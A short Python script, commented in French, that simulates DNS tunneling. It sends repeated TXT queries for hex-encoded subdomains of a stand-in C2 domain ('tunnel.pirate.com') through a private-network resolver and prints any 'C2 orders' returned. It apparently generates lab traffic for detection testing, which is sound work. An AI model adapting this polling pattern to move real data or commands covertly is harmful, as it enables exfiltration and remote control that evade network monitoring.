#!/usr/bin/env python3
"""
Simulateur de DNS Tunneling.
Établit un canal d'échange avec encapsulation bidirectionnelle :
- Requêtes fréquentes pour des sous-domaines encodés
- Demande d'enregistrements TXT pour simuler la réception d'ordres C2.
"""
import sys
import time
import argparse
from datetime import datetime
from dns import resolver

def run_tunneling(target_dns: str, tunnel_domain: str, rounds: int, interval: float):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"================================================================")
    print(f"[*] Attaque démarrée à : {now_str}")
    print(f"[*] Type : DNS Tunneling / Canal de Commande & Contrôle (C2)")
    print(f"[*] Résolveur relais : {target_dns}")
    print(f"[*] Domaine C2 : *.{tunnel_domain}")
    print(f"[*] Échanges prévus (Polling TXT) : {rounds} (Intervalle: {interval}s)")
    print(f"================================================================\n")

    res = resolver.Resolver()
    res.nameservers = [target_dns]
    res.timeout = 2
    res.lifetime = 2

    for session_seq in range(1, rounds + 1):
        payload_hex = f"4865617274426561745f53657373696f6e{session_seq:04x}"
        fqdn = f"{payload_hex}.c2.{tunnel_domain}"
        cur_ts = datetime.now().strftime("%H:%M:%S")

        print(f"  [{cur_ts}] > Polling C2 #{session_seq}/{rounds} (TXT) : {fqdn}")
        try:
            ans = res.resolve(fqdn, 'TXT')
            for rdata in ans:
                print(f"        [<] Réponse C2 : {rdata}")
        except Exception:
            pass
        time.sleep(interval)

    end_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] Session Tunneling terminée à : {end_str}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulateur de DNS Tunneling")
    parser.add_argument("--dns", default="172.28.0.2", help="IP du résolveur")
    parser.add_argument("--domain", default="tunnel.pirate.com", help="Domaine du tunnel")
    parser.add_argument("--rounds", type=int, default=20, help="Nombre de requêtes")
    parser.add_argument("--interval", type=float, default=0.4, help="Intervalle (polling)")
    args = parser.parse_args()

    run_tunneling(args.dns, args.domain, args.rounds, args.interval)
